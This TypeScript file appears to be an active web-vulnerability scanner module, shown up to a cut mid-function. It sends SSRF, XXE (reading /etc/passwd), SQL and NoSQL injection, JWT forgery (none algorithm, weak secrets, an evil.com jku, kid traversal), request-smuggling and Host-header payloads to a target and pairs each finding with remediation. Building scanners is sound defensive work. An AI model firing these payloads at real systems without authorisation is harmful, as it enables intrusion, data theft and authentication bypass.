import * as https from 'https';
import * as http from 'http';
import { ScanResult, Finding, Severity } from '../../types';
import { generateFinding } from '../modules/shared';
import { logExploit, logVuln, logRequest, logResponse } from '../scanLogger';
import { getAI } from '../../services/ai.service';
import {
  createOOBTest, measureTiming, EncodingBypasses,
  generateSSRFPayloads, generateXXEPayloads, generateNoSQLPayloads,
  generateErrorBasedSQLiPayloads, generateTimeBasedSQLiPayloads,
  generateHeaderInjectionPayloads, generateRedirectPayloads,
  generatePathTraversalPayloads, generateHostHeaderPayloads,
  generateSSIPayloads, generateGraphQLPayloads,
  generateReflectedFileDownloadPayloads,
} from '../modules/shared-attack';

const USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36';

// ─── HTTP Client ───
function makeRequest(
  targetUrl: string,
  method: string = 'GET',
  headers: Record<string, string> = {},
  timeoutOrBody: number | string = 6000
): Promise<{ statusCode: number; headers: http.IncomingHttpHeaders; body: string; redirectUrl?: string; duration: number }> {
  const timeout = typeof timeoutOrBody === 'number' ? timeoutOrBody : 6000;
  const body = typeof timeoutOrBody === 'string' ? timeoutOrBody : '';
  return new Promise((resolve, reject) => {
    const start = Date.now();
    let parsed: URL;
    try { parsed = new URL(targetUrl); } catch { reject(new Error('Invalid URL')); return; }
    logRequest('activeVuln', method, targetUrl, { note: body ? `body=${body.substring(0, 80)}` : undefined });
    const mod = parsed.protocol === 'https:' ? https : http;
    const req = mod.request({
      hostname: parsed.hostname,
      port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
      path: parsed.pathname + parsed.search,
      method,
      headers: { 'User-Agent': USER_AGENT, ...headers },
      timeout,
      rejectUnauthorized: false,
    }, (res) => {
      let data = '';
      let totalBytes = 0;
      res.on('data', (chunk: Buffer) => {
        totalBytes += chunk.length;
        if (totalBytes > 1048576) { req.destroy(); return; }
        data += chunk.toString();
      });
      res.on('end', () => {
        const dur = Date.now() - start;
        logResponse('activeVuln', targetUrl, res.statusCode || 0, { bodySnippet: data.substring(0, 60), duration: dur });
        resolve({ statusCode: res.statusCode || 0, headers: res.headers, body: data, redirectUrl: res.headers.location, duration: dur });
      });
    });
    req.on('error', reject);
    req.on('timeout', () => { req.destroy(); reject(new Error('timeout')); });
    if (body) req.write(body);
    req.end();
  });
}

async function safeRequest(targetUrl: string, method: string = 'GET', headers: Record<string, string> = {}, body: string = ''): Promise<{ statusCode: number; headers: http.IncomingHttpHeaders; body: string; redirectUrl?: string; duration: number }> {
  try {
    return await makeRequest(targetUrl, method, headers, body);
  } catch {
    return { statusCode: 0, headers: {}, body: '', duration: 0 };
  }
}

// ─── MODULE: SSRF (OWASP A10:2021) ───
async function testSSRF(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'SSRF', baseUrl, 'Testing server-side request forgery via URL parameters');
  try {
    const ssrfParams = ['url', 'fetch_url', 'webhook', 'site', 'img', 'load_url', 'redirect', 'next', 'path', 'uri', 'link', 'src', 'dest', 'target', 'reference', 'callback', 'return_url', 'continue', 'checkout', 'go', 'out', 'view', 'to', 'return', 'redirect_url', 'returnTo', 'redir', 'redirect_uri', 'origin', 'page'];

    const payloads = generateSSRFPayloads();

    for (const param of ssrfParams) {
      let found = false;
      for (const { url, indicator, type } of payloads) {
        if (found) break;
        try {
          const encodedPayload = encodeURIComponent(url);
          const testUrl = `${baseUrl}?${param}=${encodedPayload}`;
          const res = await safeRequest(testUrl, 'GET', {}, '');

          // Check response body for known indicators
          if (indicator && indicator.split('|').some(i => res.body.toLowerCase().includes(i.toLowerCase()))) {
            findings.push(generateFinding(
              'Server-Side Request Forgery (SSRF)',
              `The application fetches URLs from user input via parameter "${param}", allowing access to internal resources.`,
              Severity.CRITICAL,
              'Active Vulnerability',
              domain,
              `Parameter: ${param}, Type: ${type}, Payload: ${url}`,
              'SSRF can expose cloud metadata, internal services, credentials, and enable remote code execution',
              'Validate and sanitize all URL inputs; use allowlists for permitted domains; block internal IP ranges; use network segmentation',
              ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', 'https://portswigger.net/web-security/ssrf']
            ));
            found = true;
          }

          // Also flag if server returns 500+ error when processing the URL parameter (server tried to fetch but failed)
          if (!found && res.statusCode >= 500) {
            const isInternal = url.includes('127.0.0.1') || url.includes('localhost') || url.includes('169.254.169.254') || url.includes('metadata.google.internal');
            if (isInternal) {
              // Baseline check: verify 500 is specific to internal URL (not generic error handling)
              try {
                const baselineRes = await safeRequest(`${baseUrl}?${param}=https://httpbin.org/status/200`, 'GET', {}, '');
                const isSpecificToInternal = baselineRes.statusCode < 500;
                if (isSpecificToInternal) {
                  findings.push(generateFinding(
                    'Potential SSRF (Server Error on Internal URL)',
                    `Parameter "${param}" triggers a server error (HTTP ${res.statusCode}) when an internal URL is provided, indicating the server attempts to fetch user-supplied URLs without proper validation.`,
                    Severity.HIGH,
                    'Active Vulnerability',
                    domain,
                    `Parameter: ${param}, Payload: ${url}, Response: ${res.statusCode} (baseline: ${baselineRes.statusCode})`,
                    'Server error on internal URL suggests the server processes user-supplied URLs, enabling potential SSRF',
                    'Validate and sanitize all URL inputs; use allowlists for permitted domains; block internal IP ranges',
                    ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery']
                  ));
                  found = true;
                }
              } catch {
                // If baseline fails, still flag but with lower confidence
                findings.push(generateFinding(
                  'Potential SSRF (Server Error on Internal URL)',
                  `Parameter "${param}" triggers a server error (HTTP ${res.statusCode}) when an internal URL is provided.`,
                  Severity.MEDIUM,
                  'Active Vulnerability',
                  domain,
                  `Parameter: ${param}, Payload: ${url}, Response: ${res.statusCode} (baseline unavailable)`,
                  'Server error on internal URL suggests possible SSRF',
                  'Validate and sanitize all URL inputs; use allowlists for permitted domains; block internal IP ranges',
                  ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery']
                ));
                found = true;
              }
            }
          }
        } catch {}
      }

      // Blind SSRF via timing analysis
      if (!found) {
        try {
          const normalUrl = `${baseUrl}?${param}=https://httpbin.org/get`;
          const internalUrl = `${baseUrl}?${param}=http://127.0.0.1:1`;

          const normalRes = await safeRequest(normalUrl, 'GET', {}, '');
          const internalRes = await safeRequest(internalUrl, 'GET', {}, '');

          // If internal request times out differently, SSRF may exist but be blocked
          if (internalRes.duration > normalRes.duration * 3 && internalRes.duration > 5000) {
            findings.push(generateFinding(
              'Potential Blind SSRF (Timing)',
              `Parameter "${param}" may be vulnerable to SSRF — internal requests cause significant delay.`,
              Severity.HIGH,
              'Active Vulnerability',
              domain,
              `Parameter: ${param}, Normal: ${normalRes.duration}ms, Internal: ${internalRes.duration}ms`,
              'Blind SSRF can be exploited via out-of-band techniques or timing side-channels',
              'Use network-level controls; block private IP ranges; implement URL validation allowlists',
              ['https://portswigger.net/web-security/ssrf/blind']
            ));
          }
        } catch {}
      }
    }

    // Test POST body SSRF
    try {
      const postParams = ['url', 'webhook', 'callback', 'redirect_uri'];
      for (const param of postParams) {
        const body = JSON.stringify({ [param]: 'http://169.254.169.254/latest/meta-data/' });
        const res = await safeRequest(baseUrl, 'POST', { 'Content-Type': 'application/json' }, body);
        if ('ami-id|instance-id|meta-data'.split('|').some(i => res.body.toLowerCase().includes(i))) {
          findings.push(generateFinding(
            'SSRF via POST Body',
            `The application processes URLs from POST body parameter "${param}".`,
            Severity.CRITICAL,
            'Active Vulnerability',
            domain,
            `Parameter: ${param} in POST body, Response contains cloud metadata`,
            'SSRF via POST body can bypass GET-only input validation',
            'Validate all URL inputs regardless of HTTP method',
            ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery']
          ));
          break;
        }
      }
    } catch {}
  } catch (e) { errors.push(`SSRF: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: XXE (OWASP A05:2021) ───
async function testXXE(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'XXE', baseUrl, 'Testing XML external entity injection');
  try {
    const payloads = generateXXEPayloads();

    for (const { payload, indicator, type } of payloads) {
      try {
        const res = await safeRequest(baseUrl, 'POST', { 'Content-Type': 'application/xml' }, payload);
        if (indicator && indicator.split('|').some(i => res.body.toLowerCase().includes(i.toLowerCase()))) {
          findings.push(generateFinding(
            'XML External Entity (XXE) Injection',
            `The application processes XML input and is vulnerable to external entity injection.`,
            Severity.CRITICAL,
            'Active Vulnerability',
            domain,
            `Type: ${type}, Response contains entity expansion output`,
            'XXE can read local files, perform SSRF, cause DoS (billion laughs), and leak credentials',
            'Disable DTD processing and external entities; use JSON instead of XML; validate and sanitize XML input',
            ['https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing', 'https://portswigger.net/web-security/xxe']
          ));
          break;
        }
      } catch {}
    }

    // Test Content-Type variations
    const contentTypes = [
      'application/xml',
      'text/xml',
      'application/soap+xml',
      'application/rss+xml',
      'application/atom+xml',
      'image/svg+xml',
    ];
    for (const ct of contentTypes) {
      try {
        const payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>';
        const res = await safeRequest(baseUrl, 'POST', { 'Content-Type': ct }, payload);
        if ('root:|/bin/bash|/bin/sh'.split('|').some(i => res.body.toLowerCase().includes(i.toLowerCase()))) {
          findings.push(generateFinding(
            'XXE via Content-Type Variation',
            `The application accepts XXE via Content-Type: ${ct}.`,
            Severity.CRITICAL,
            'Active Vulnerability',
            domain,
            `Content-Type: ${ct}, Response contains /etc/passwd content`,
            'Content-Type-based XXE bypasses basic content type validation',
            'Whitelist allowed Content-Types; disable XML parsing for untrusted content',
            ['https://portswigger.net/web-security/xxe']
          ));
          break;
        }
      } catch {}
    }
  } catch (e) { errors.push(`XXE: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: NoSQL Injection ───
async function testNoSQL(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'NoSQLi', baseUrl, 'Testing NoSQL injection via JSON operators');
  try {
    const payloads = generateNoSQLPayloads();
    const loginEndpoints = ['/login', '/api/login', '/auth/login', '/api/auth/login', '/signin', '/api/signin', '/user/login', '/account/login'];

    for (const endpoint of loginEndpoints) {
      let found = false;
      for (const { payload, indicator, type } of payloads) {
        if (found) break;
        try {
          const targetUrl = `${baseUrl}${endpoint}`;
          const res = await safeRequest(targetUrl, 'POST', { 'Content-Type': 'application/json' }, payload);
          if (indicator.split('|').some(i => res.body.toLowerCase().includes(i.toLowerCase()))) {
            findings.push(generateFinding(
              'NoSQL Injection',
              `The application is vulnerable to NoSQL injection at ${endpoint} via ${type}.`,
              Severity.CRITICAL,
              'Active Vulnerability',
              domain,
              `Endpoint: ${endpoint}, Type: ${type}, Response indicates authentication bypass`,
              'NoSQL injection can bypass authentication, extract data, and execute arbitrary queries',
              'Validate and sanitize all input; use parameterized queries; reject operator characters; use type checking',
              ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/16-Testing_for_NoSQL_Injection']
            ));
            found = true;
          }
        } catch {}
      }
    }
  } catch (e) { errors.push(`NoSQL: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: SQL Injection via POST Bodies ───
async function testSQLiPOST(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'SQLi', baseUrl, 'Testing SQL injection via POST parameters');
  try {
    const postParams = ['search', 'query', 'q', 'name', 'email', 'user', 'login', 'password', 'id', 'page', 'sort', 'filter', 'order', 'offset', 'limit', 'category', 'type', 'status', 'column', 'table'];
    const payloads = generateErrorBasedSQLiPayloads();

    const loginEndpoints = ['/login', '/api/login', '/search', '/api/search', '/api/users', '/api/query'];

    for (const endpoint of loginEndpoints) {
      for (const param of postParams) {
        let found = false;
        for (const { payload, indicator, label } of payloads) {
          if (found) break;
          try {
            const body = JSON.stringify({ [param]: payload });
            const res = await safeRequest(`${baseUrl}${endpoint}`, 'POST', { 'Content-Type': 'application/json' }, body);
            if (indicator.split('|').some(i => res.body.toLowerCase().includes(i.toLowerCase()))) {
              findings.push(generateFinding(
                'SQL Injection via POST Body',
                `The application is vulnerable to SQL injection via POST parameter "${param}" at ${endpoint}.`,
                Severity.CRITICAL,
                'Active Vulnerability',
                domain,
                `Endpoint: ${endpoint}, Parameter: ${param}, Type: ${label}, Response indicates SQL error`,
                'SQL injection can extract, modify, or delete entire databases and enable remote code execution',
                'Use parameterized queries/prepared statements; validate all input; implement WAF rules',
                ['https://owasp.org/www-community/attacks/SQL_Injection', 'https://portswigger.net/web-security/sql-injection']
              ));
              found = true;
            }
            // Also flag 500 errors on SQLi payloads — but verify it's not generic error handling
            if (!found && res.statusCode >= 500) {
              const isSQLiPayload = payload.includes("'") || payload.includes('"') || payload.includes("--") || payload.includes("UNION") || payload.includes("SELECT");
              if (isSQLiPayload) {
                // Baseline check: ensure benign payload doesn't also produce 500
                try {
                  const baselineRes = await safeRequest(`${baseUrl}${endpoint}`, 'POST', { 'Content-Type': 'application/json' }, JSON.stringify({ [param]: 'test123456' }));
                  if (baselineRes.statusCode < 500) {
                    findings.push(generateFinding(
                      `Potential SQL Injection (Error-Based) at ${endpoint}`,
                      `POST parameter "${param}" triggers a server error (HTTP ${res.statusCode}) when a SQL injection payload is provided. The server may be processing the SQL input but encountering database errors.`,
                      Severity.HIGH,
                      'Active Vulnerability',
                      domain,
                      `Endpoint: ${endpoint}, Parameter: ${param}, Payload: ${payload}, Response: ${res.statusCode} (baseline: ${baselineRes.statusCode})`,
                      'Server error on SQLi payload suggests the input is being processed by a database',
                      'Use parameterized queries; validate all input; implement error handling',
                      ['https://owasp.org/www-community/attacks/SQL_Injection']
                    ));
                    found = true;
                  }
                } catch {
                  // If baseline fails, still flag
                  findings.push(generateFinding(
                    `Potential SQL Injection (Error-Based) at ${endpoint}`,
                    `POST parameter "${param}" triggers a server error (HTTP ${res.statusCode}) when a SQL injection payload is provided.`,
                    Severity.MEDIUM,
                    'Active Vulnerability',
                    domain,
                    `Endpoint: ${endpoint}, Parameter: ${param}, Payload: ${payload}, Response: ${res.statusCode} (baseline unavailable)`,
                    'Server error on SQLi payload suggests possible SQL injection',
                    'Use parameterized queries; validate all input; implement error handling',
                    ['https://owasp.org/www-community/attacks/SQL_Injection']
                  ));
                  found = true;
                }
              }
            }
          } catch {}
        }
      }
    }

    // Test form-encoded POST
    try {
      const body = "username=admin' OR '1'='1&password=anything";
      const res = await safeRequest(`${baseUrl}/login`, 'POST', { 'Content-Type': 'application/x-www-form-urlencoded' }, body);
      if ('welcome|dashboard|token|success|200|admin'.split('|').some(i => res.body.toLowerCase().includes(i.toLowerCase()))) {
        findings.push(generateFinding(
          'SQL Injection via Form-Encoded POST',
          'The application is vulnerable to SQL injection via form-encoded POST body.',
          Severity.CRITICAL,
          'Active Vulnerability',
          domain,
          'Form-encoded body: username=admin\' OR \'1\'=\'1, Response indicates auth bypass',
          'SQL injection via form encoding can bypass input validation',
          'Use parameterized queries; validate all input regardless of encoding',
          ['https://owasp.org/www-community/attacks/SQL_Injection']
        ));
      }
    } catch {}
  } catch (e) { errors.push(`SQLi POST: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Time-Based Blind SQLi ───
async function testSQLiBlind(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'SQLi-Blind', baseUrl, 'Testing time-based blind SQL injection');
  try {
    const testParams = ['id', 'page', 'sort', 'order', 'limit', 'offset', 'user_id', 'item_id'];
    const payloads = generateTimeBasedSQLiPayloads(5);

    for (const param of testParams) {
      try {
        const requestFn = async (payload: string) => {
          const testUrl = `${baseUrl}?${param}=${encodeURIComponent(payload)}`;
          const res = await safeRequest(testUrl);
          return res.duration;
        };

        const timing = await measureTiming(
          requestFn,
          [`${baseUrl}?${param}=1`, `${baseUrl}?${param}=2`],
          payloads.map(p => ({ label: p.label, payload: p.payload, expectedDelayMs: 4500 })),
          { threshold: 3000, confidenceThreshold: 1 }
        );

        if (timing.isBlind(3000)) {
          findings.push(generateFinding(
            'Time-Based Blind SQL Injection',
            `Parameter "${param}" is vulnerable to time-based blind SQL injection.`,
            Severity.CRITICAL,
            'Active Vulnerability',
            domain,
            `Parameter: ${param}, Baseline: ${timing.baseline}ms, Confidence: ${timing.confidence}, Max delay: ${Math.max(...timing.tests.map(t => t.duration))}ms`,
            'Blind SQL injection can extract data character-by-character via timing differences',
            'Use parameterized queries; implement query timeouts; monitor for slow queries',
            ['https://portswigger.net/web-security/sql-injection/blind']
          ));
          break;
        }
      } catch {}
    }
  } catch (e) { errors.push(`SQLi Blind: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: JWT Vulnerabilities ───
async function testJWT(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'JWT', baseUrl, 'Testing JWT algorithm confusion, none-algorithm, and weak secret');
  try {
    // Test none algorithm
    const jwtNoneVariants = ['none', 'None', 'NONE', 'nOnE', 'none ', ' none', 'NONE '];
    for (const alg of jwtNoneVariants) {
      try {
        const header = Buffer.from(JSON.stringify({ alg, typ: 'JWT' })).toString('base64url');
        const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');
        const token = `${header}.${payload}.`;
        const res = await safeRequest(`${baseUrl}`, 'GET', { 'Authorization': `Bearer ${token}` }, '');
        if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid') && !res.body.toLowerCase().includes('expired')) {
          findings.push(generateFinding(
            'JWT None Algorithm Attack',
            `The application accepts JWT tokens with algorithm "${alg}", allowing authentication bypass.`,
            Severity.CRITICAL,
            'Active Vulnerability',
            domain,
            `Algorithm: ${alg}, Token accepted without signature verification`,
            'Attackers can forge arbitrary JWT tokens and impersonate any user',
            'Reject tokens with algorithm "none"; always verify signatures on the server; use strong secrets',
            ['https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/']
          ));
          break;
        }
      } catch {}
    }

    // Test alg confusion (RS256 → HS256 key confusion)
    try {
      const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');
      // Sign with empty string as "secret" (common key confusion attack)
      const crypto = await import('crypto');
      const signature = crypto.createHmac('sha256', '').update(`${header}.${payload}`).digest('base64url');
      const token = `${header}.${payload}.${signature}`;
      const res = await safeRequest(`${baseUrl}`, 'GET', { 'Authorization': `Bearer ${token}` }, '');
      if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid')) {
        findings.push(generateFinding(
          'JWT Algorithm Confusion (Key Confusion)',
          'The application may be vulnerable to JWT algorithm confusion attack.',
          Severity.HIGH,
          'Active Vulnerability',
          domain,
          'Signed with HS256 using empty secret, token may be accepted',
          'Key confusion attacks exploit asymmetric/symmetric algorithm mixing to forge tokens',
          'Validate algorithm header; use allowlist for permitted algorithms; never use the algorithm from the token',
          ['https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/']
        ));
      }
    } catch {}

    // Test weak secret (common passwords)
    try {
      const commonSecrets = ['secret', 'password', 'jwt-secret', 'super-secret', 'changeme', '123456', 'key', 'test', 'admin', 'cyberguard-dev-secret-2026-change-in-production'];
      const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');
      const crypto = await import('crypto');

      for (const secret of commonSecrets) {
        try {
          const signature = crypto.createHmac('sha256', secret).update(`${header}.${payload}`).digest('base64url');
          const token = `${header}.${payload}.${signature}`;
          const res = await safeRequest(`${baseUrl}`, 'GET', { 'Authorization': `Bearer ${token}` }, '');
          if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid')) {
            findings.push(generateFinding(
              'JWT Weak Secret',
              `The application uses a weak JWT signing secret: "${secret}".`,
              Severity.CRITICAL,
              'Active Vulnerability',
              domain,
              `Secret: ${secret}, Token accepted`,
              'Weak JWT secrets allow attackers to forge authentication tokens',
              'Use cryptographically strong random secrets (256+ bits); rotate secrets regularly',
              ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens']
            ));
            break;
          }
        } catch {}
      }
    } catch {}

    // Test expired token acceptance
    try {
      const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 946684800, exp: 946684860 })).toString('base64url'); // Expired in 2000
      const crypto = await import('crypto');
      const signature = crypto.createHmac('sha256', 'test').update(`${header}.${payload}`).digest('base64url');
      const token = `${header}.${payload}.${signature}`;
      const res = await safeRequest(`${baseUrl}`, 'GET', { 'Authorization': `Bearer ${token}` }, '');
      if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('expired') && !res.body.toLowerCase().includes('invalid')) {
        findings.push(generateFinding(
          'JWT Expiration Not Validated',
          'The application accepts expired JWT tokens.',
          Severity.HIGH,
          'Active Vulnerability',
          domain,
          'Token with exp: 946684860 (year 2000) was accepted',
          'Accepting expired tokens allows replay attacks and credential theft',
          'Always validate JWT expiration claims on the server side',
          ['https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens']
        ));
      }
    } catch {}

    // Test jku header injection
    try {
      const header = Buffer.from(JSON.stringify({ alg: 'RS256', typ: 'JWT', jku: 'https://evil.com/jwks.json' })).toString('base64url');
      const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');
      const token = `${header}.${payload}.fake-sig`;
      const res = await safeRequest(`${baseUrl}`, 'GET', { 'Authorization': `Bearer ${token}` }, '');
      if (res.statusCode === 200 && !res.body.toLowerCase().includes('unauthorized') && !res.body.toLowerCase().includes('invalid')) {
        findings.push(generateFinding(
          'JWT JKU Header Injection',
          'The application may fetch JWT public keys from an attacker-controlled URL (jku header).',
          Severity.HIGH,
          'Active Vulnerability',
          domain,
          'Token with jku: https://evil.com/jwks.json sent, response indicates acceptance',
          'JKU injection allows attackers to serve their own public keys for signature verification',
          'Never trust the jku header; use a fixed set of trusted key sources',
          ['https://portswigger.net/web-security/jwt/algorithm-confusion']
        ));
      }
    } catch {}

    // Test 'kid' header injection (path traversal / SQLi via key id)
    try {
      const kidneyPayloads = [
        { kid: '../../../../../../../dev/null', label: 'path-traversal' },
        { kid: "1' UNION SELECT 'key'--", label: 'sql-injection' },
        { kid: '0', label: 'numeric' },
      ];
      for (const { kid, label } of kidneyPayloads) {
        const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT', kid })).toString('base64url');
        const payload = Buffer.from(JSON.stringify({ sub: 'admin', iat: 1700000000, exp: 9999999999 })).toString('base64url');
        const token = `${header}.${payload}.fake-sig`;
        const res = await safeRequest(`${baseUrl}`, 'GET', { 'Authorization': `Bearer ${token}` }, '');
        const bodyLower = res.body.toLowerCase();
        const errorReflects = bodyLower.includes(kid) || bodyLower.includes('file') || bodyLower.includes('sql') || bodyLower.includes('no such file');
        if (res.statusCode === 500 && errorReflects) {
          findings.push(generateFinding(
            'JWT kid Header Injection',
            `The application uses the JWT "kid" header as a lookup key (${label}) without validation, potentially enabling key confusion or file read.`,
            Severity.HIGH,
            'Active Vulnerability',
            domain,
            `kid: ${kid} (${label}), Server error reflects the kid value or file/sql lookup`,
            'kid injection can read arbitrary files or query SQL to obtain the signing key, allowing token forgery',
            'Validate the kid against a server-side allowlist; never derive file paths or queries from the kid header',
            ['https://portswigger.net/web-security/jwt/algorithm-confusion']
          ));
          break;
        }
      }
    } catch {}
  } catch (e) { errors.push(`JWT: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: HTTP Request Smuggling ───
async function testSmuggling(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'Smuggling', baseUrl, 'Testing HTTP request smuggling via CL/TE header manipulation');
  try {
    // CL.TE
    try {
      const body = '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: ' + domain + '\r\n\r\n';
      const res = await safeRequest(baseUrl, 'POST', { 'Content-Length': '6', 'Transfer-Encoding': 'chunked' }, body);
      if (res.statusCode === 200) {
        findings.push(generateFinding(
          'HTTP Request Smuggling (CL.TE)',
          'The server may be vulnerable to CL.TE request smuggling.',
          Severity.CRITICAL,
          'Active Vulnerability',
          domain,
          'CL.TE payload sent with conflicting CL/TE headers, server responded 200',
          'Request smuggling can bypass security controls, poison caches, and steal credentials',
          'Ensure front-end and back-end servers parse HTTP headers consistently; disable transfer-encoding on front-end',
          ['https://portswigger.net/web-security/request-smuggling']
        ));
      }
    } catch {}

    // TE.CL
    try {
      const body = 'POST / HTTP/1.1\r\nHost: ' + domain + '\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 37\r\nTransfer-Encoding: identity\r\n\r\n0\r\n\r\nGET /smuggled HTTP/1.1\r\n\r\n';
      const res = await safeRequest(baseUrl, 'POST', { 'Transfer-Encoding': 'identity', 'Content-Length': '44' }, body);
      if (res.statusCode === 200) {
        findings.push(generateFinding(
          'HTTP Request Smuggling (TE.CL)',
          'The server may be vulnerable to TE.CL request smuggling.',
          Severity.CRITICAL,
          'Active Vulnerability',
          domain,
          'TE.CL payload sent with conflicting CL/TE headers, server responded 200',
          'TE.CL smuggling can lead to credential theft and cache poisoning',
          'Disable Transfer-Encoding on front-end proxies; use HTTP/2 end-to-end',
          ['https://portswigger.net/web-security/request-smuggling']
        ));
      }
    } catch {}

    // TE.TE obfuscation
    try {
      const body = '0\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: ' + domain + '\r\n\r\n';
      const res = await safeRequest(baseUrl, 'POST', {
        'Transfer-Encoding': 'chunked',
        'Transfer-Encoding ': 'chunked',
        'Content-Length': '6',
      }, body);
      if (res.statusCode === 200) {
        findings.push(generateFinding(
          'HTTP Request Smuggling (TE.TE Obfuscation)',
          'The server may be vulnerable to TE.TE request smuggling with header obfuscation.',
          Severity.HIGH,
          'Active Vulnerability',
          domain,
          'TE.TE obfuscated payload with duplicate Transfer-Encoding headers, server responded 200',
          'TE.TE obfuscation bypasses naive transfer-encoding validation',
          'Normalize and validate Transfer-Encoding headers; strip duplicates',
          ['https://portswigger.net/web-security/request-smuggling']
        ));
      }
    } catch {}

    // CL.TE with chunk extensions
    try {
      const body = '0;ext=value\r\n\r\nGET /smuggled HTTP/1.1\r\nHost: ' + domain + '\r\n\r\n';
      const res = await safeRequest(baseUrl, 'POST', { 'Transfer-Encoding': 'chunked', 'Content-Length': '6' }, body);
      if (res.statusCode === 200) {
        findings.push(generateFinding(
          'HTTP Request Smuggling (CL.TE Chunk Extensions)',
          'The server may be vulnerable to CL.TE smuggling via chunk extension obfuscation.',
          Severity.HIGH,
          'Active Vulnerability',
          domain,
          'Chunk extension obfuscation payload sent, server responded 200',
          'Chunk extensions can be used to bypass transfer-encoding parsers',
          'Strip chunk extensions before processing; use strict parsing',
          ['https://portswigger.net/web-security/request-smuggling']
        ));
      }
    } catch {}

    // H2.CL smuggling (HTTP/2 specific)
    try {
      const body = 'SM\r\n\r\n\x00\x00\x06\x01\x00\x00\x00\x00\x03data\x01\x00\x00\x00\x00';
      const res = await safeRequest(baseUrl, 'POST', {
        'Transfer-Encoding': 'chunked',
        'Content-Length': '6',
        'Connection': 'keep-alive',
      }, body);
      if (res.statusCode === 200) {
        findings.push(generateFinding(
          'HTTP/2 Request Smuggling (H2.CL)',
          'The server may be vulnerable to HTTP/2 CL smuggling.',
          Severity.CRITICAL,
          'Active Vulnerability',
          domain,
          'H2.CL payload sent with HTTP/2 framing, server responded 200',
          'HTTP/2 smuggling can bypass all HTTP/1.1-based security controls',
          'Use HTTP/2 exclusively end-to-end; disable HTTP/1.1 upgrade; validate Content-Length in H2 frames',
          ['https://portswigger.net/web-security/request-smuggling/smuggling-via-http2']
        ));
      }
    } catch {}
  } catch (e) { errors.push(`Smuggling: ${e instanceof Error ? e.message : String(e)}`); }
}

// ─── MODULE: Host Header Injection ───
async function testHostHeader(domain: string, baseUrl: string, findings: Finding[], errors: string[]): Promise<void> {
  logExploit('activeVuln', 'HostHeader', baseUrl, 'Testing host header injection for password reset poison / cache poisoning');
  try {
    const payloads = generateHostHeaderPayloads();

    for (const { header, indicator, type } of payloads) {
      try {
        const res = await safeRequest(baseUrl, 'GET', header, '');
        if (indicator && res.body.toLowerCase().includes(indicator.toLowerCase())) {
          const severity = type === 'host-crlf' ? Severity.CRITICAL :
            type === 'host-override' ? Severity.HIGH : Severity.MEDIUM;
          findings.push(generateFinding(
            'Host Header Injection',
            `The application reflects the ${Object.keys(header)[0]} header in its response.`,
            severity,
            'Active Vulnerability',
            domain,
            `${Object.entries(header).map(([k, v]) => `${k}: ${v}`).join(', ')}, Reflected in response body`,
            'Host header injection can lead to password reset poisoning, cache poisoning, and web server routing confusion',
            'Validate the Host header against a whitelist of allowed domains; use absolute URLs for internal links',
            ['https://portswigger.net/web-security/host-header']
          ));
          break;
        }
      } catch {}
    }

    // Password reset poisoning test
    try {
      const evilHost = 'evil.com';
